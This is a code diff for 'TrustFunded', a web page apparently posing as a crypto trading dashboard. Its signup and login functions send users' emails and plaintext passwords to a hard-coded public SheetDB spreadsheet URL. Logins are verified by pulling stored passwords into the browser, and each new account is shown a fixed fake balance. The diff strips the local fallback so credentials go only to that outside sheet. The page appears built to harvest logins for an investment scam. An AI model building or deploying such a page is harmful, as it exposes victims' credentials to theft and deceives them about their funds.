@@ -57,8 +57,6 @@
         .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #f3f3f3; border-top: 2px solid #fcd535; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
-        .status-badge { position: fixed; bottom: 10px; right: 10px; font-size: 10px; background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 10px; color: #ff6b6b; z-index: 9999; }
-        .status-badge.connected { color: #0ecb81; }
     </style>
 </head>
 <body>
@@ -151,7 +149,6 @@
     </div>
 
     <div id="main-site">
-        <!-- All your dashboard HTML remains the same -->
         <div class="max-w-md mx-auto min-h-screen relative">
             <div class="flex justify-between items-center px-4 py-4 text-xs font-medium text-gray-500">
                 <div class="flex gap-6"><span class="tab-active pb-1 text-white cursor-pointer">Spot</span><span class="cursor-pointer hover:text-white">Funding</span><span class="cursor-pointer hover:text-white">Earn</span></div>
@@ -187,16 +184,12 @@
     </div>
 
     <div id="toast-message" class="toast-message"></div>
-    <div id="status-badge" class="status-badge">📊 Connecting...</div>
 
     <script>
         lucide.createIcons();
         
-        // ========= SHEETDB CONFIGURATION =========
+        // ========= SHEETDB CONFIGURATION - NO LOCALSTORAGE =========
         const SHEETDB_API = "https://sheetdb.io/api/v1/pw5rowfqub6av";
-        
-        // Use a proxy to avoid CORS issues
-        const PROXY_URL = "https://api.allorigins.win/raw?url=";
         
         function showToast(msg, isSuccess = true) {
             const toast = document.getElementById('toast-message');
@@ -218,91 +211,47 @@
             }
         }
         
-        // Check connection status
-        async function checkConnection() {
-            const statusDiv = document.getElementById('status-badge');
-            try {
-                const response = await fetch(SHEETDB_API);
-                if (response.ok) {
-                    statusDiv.textContent = '✅ Google Sheets Connected';
-                    statusDiv.classList.add('connected');
-                } else {
-                    statusDiv.textContent = '⚠️ Connection Issue';
-                }
-            } catch (error) {
-                statusDiv.textContent = '⚠️ Using Local Storage';
-                console.log('Using localStorage fallback');
-            }
-        }
-        
-        // Save user to SheetDB (using JSONP approach for CORS)
+        // Add user to SheetDB - NO LOCALSTORAGE
         async function addUserToSheet(user) {
-            try {
-                // Try direct fetch with mode: 'no-cors'
-                const response = await fetch(SHEETDB_API, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        data: {
-                            Timestamp: new Date().toLocaleString(),
-                            Email: user.email,
-                            Password: user.password,
-                            Referral: user.referral || '',
-                            Balance: user.balance || 12450.80,
-                            Created_At: user.createdAt || new Date().toISOString()
-                        }
-                    })
-                });
-                
-                if (response.ok) {
-                    return true;
-                } else {
-                    throw new Error('HTTP error');
-                }
-            } catch (error) {
-                console.error('SheetDB error:', error);
-                // Fallback to localStorage
-                let users = localStorage.getItem('trustfunded_users');
-                users = users ? JSON.parse(users) : [];
-                users.push(user);
-                localStorage.setItem('trustfunded_users', JSON.stringify(users));
-                return true;
+            const response = await fetch(SHEETDB_API, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    data: {
+                        Timestamp: new Date().toLocaleString(),
+                        Email: user.email,
+                        Password: user.password,
+                        Referral: user.referral || '',
+                        Balance: user.balance || 12450.80,
+                        Created_At: user.createdAt || new Date().toISOString()
+                    }
+                })
+            });
+            
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`HTTP ${response.status}: ${errorText}`);
             }
+            
+            return await response.json();
         }
         
+        // Check if user exists
         async function userExists(email) {
-            try {
-                const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
-                const users = await response.json();
-                return users && users.length > 0;
-            } catch (error) {
-                // Fallback to localStorage
-                const users = localStorage.getItem('trustfunded_users');
-                if (users) {
-                    return JSON.parse(users).some(u => u.email === email);
-                }
-                return false;
-            }
+            const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
+            const users = await response.json();
+            return users && users.length > 0;
         }
         
+        // Verify login
         async function verifyLogin(email, password) {
-            try {
-                const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
-                const users = await response.json();
-                const user = users.find(u => u.Password === password);
-                return user || null;
-            } catch (error) {
-                // Fallback to localStorage
-                const users = localStorage.getItem('trustfunded_users');
-                if (users) {
-                    const user = JSON.parse(users).find(u => u.email === email && u.password === password);
-                    return user || null;
-                }
-                return null;
-            }
+            const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
+            const users = await response.json();
+            const user = users.find(u => u.Password === password);
+            return user || null;
         }
         
         async function handleLogin() {
@@ -326,10 +275,6 @@
                 const user = await verifyLogin(email, password);
                 
                 if (user) {
-                    localStorage.setItem('currentUser', JSON.stringify({
-                        email: user.Email || user.email,
-                        balance: user.Balance || 12450.80
-                    }));
                     showToast('Login successful! Welcome to TrustFunded', true);
                     setTimeout(() => {
                         document.getElementById('login-overlay').classList.remove('active');
@@ -343,7 +288,7 @@
                 }
             } catch (error) {
                 console.error('Login error:', error);
-                showToast('Login failed. Please try again.', false);
+                showToast('Login failed: ' + error.message, false);
             } finally {
                 setButtonLoading(loginBtn, false, 'Continue to Dashboard');
             }
@@ -372,6 +317,7 @@
             setButtonLoading(signupBtn, true, 'Create Account');
             
             try {
+                // Check if user exists
                 const exists = await userExists(email);
                 if (exists) {
                     showToast('Email already registered. Please login.', false);
@@ -387,24 +333,21 @@
                     balance: 12450.80
                 };
                 
-                const saved = await addUserToSheet(newUser);
+                // Save to SheetDB only - NO LOCALSTORAGE
+                await addUserToSheet(newUser);
                 
-                if (saved) {
-                    localStorage.setItem('currentUser', JSON.stringify(newUser));
-                    showToast('Account created successfully! Welcome to TrustFunded', true);
-                    setTimeout(() => {
-                        document.getElementById('login-overlay').classList.remove('active');
-                        document.body.classList.add('show-dashboard');
-                        document.body.style.overflow = 'auto';
-                        document.documentElement.style.overflow = 'auto';
-                        lucide.createIcons();
-                    }, 500);
-                } else {
-                    showToast('Failed to create account. Please try again.', false);
-                }
+                showToast('Account created successfully! Welcome to TrustFunded', true);
+                setTimeout(() => {
+                    document.getElementById('login-overlay').classList.remove('active');
+                    document.body.classList.add('show-dashboard');
+                    document.body.style.overflow = 'auto';
+                    document.documentElement.style.overflow = 'auto';
+                    lucide.createIcons();
+                }, 500);
+                
             } catch (error) {
                 console.error('Signup error:', error);
-                showToast('Signup failed. Please try again.', false);
+                showToast('Signup failed: ' + error.message, false);
             } finally {
                 setButtonLoading(signupBtn, false, 'Create Account');
             }
@@ -480,7 +423,6 @@
         
         setInterval(updateLiveTicker, 5000);
         updateLiveTicker();
-        checkConnection();
         
         window.addEventListener('load', () => {
             setTimeout(() => {
